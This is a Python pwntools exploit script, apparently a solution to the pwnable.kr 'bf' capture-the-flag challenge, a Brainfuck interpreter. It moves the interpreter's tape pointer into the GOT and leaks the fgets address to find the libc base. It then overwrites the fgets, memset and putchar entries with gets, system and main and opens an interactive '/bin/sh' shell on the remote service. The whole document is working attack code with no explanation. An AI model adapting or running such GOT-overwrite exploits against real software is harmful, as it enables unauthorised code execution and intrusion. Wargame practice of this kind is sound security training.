from pwn import *

elf = ELF('./bf')
got = {'fgets': elf.got['fgets'], 'memset': elf.got['memset'], 'putchar': elf.got['putchar']}
libc = ELF('./bf_libc.so')
offset = {'fgets': libc.symbols['fgets'], 'gets': libc.symbols['gets'], 'system': libc.symbols['system']}
main_addr = elf.symbols['main']  # 0x8048671
tape_addr = 0x804a0a0  # default p-pointer value

move_addr = lambda cur, new: b'<'*(cur-new) if cur > new else b'>'*(new-cur)
read_addr = lambda n: b'.>'*n + b'<'*n
write_addr = lambda n: b',>'*n + b'<'*n

payload = move_addr(tape_addr, got['fgets'])
payload += read_addr(4)
payload += write_addr(4)
payload += move_addr(got['fgets'], got['memset'])
payload += write_addr(4)
payload += move_addr(got['memset'], got['putchar'])
payload += write_addr(4)
payload += b'.'  # return main 
io = remote('pwnable.kr', 9001)
io.recvuntil(b'[ ]\n')
io.sendline(payload)
sleep(1)
fgets_addr = u32(io.recv(4).ljust(4, b'\x00'))
# fgets_addr = int.from_bytes(io.recv(4), byteorder='little', signed=False)
log.info('fgets_addr => %s' % hex(fgets_addr))
libc_base = fgets_addr - offset['fgets']
log.success('libc_base_addr => %s', hex(libc_base))
gets_addr = libc_base + offset['gets']
log.info('gets_addr => %s' % hex(gets_addr))
system_addr = libc_base + offset['system']
log.info('system_addr => %s' % hex(system_addr))
shellcode = p32(system_addr) + p32(gets_addr) + p32(main_addr) + b'/bin/sh'
io.sendline(shellcode)
io.interactive()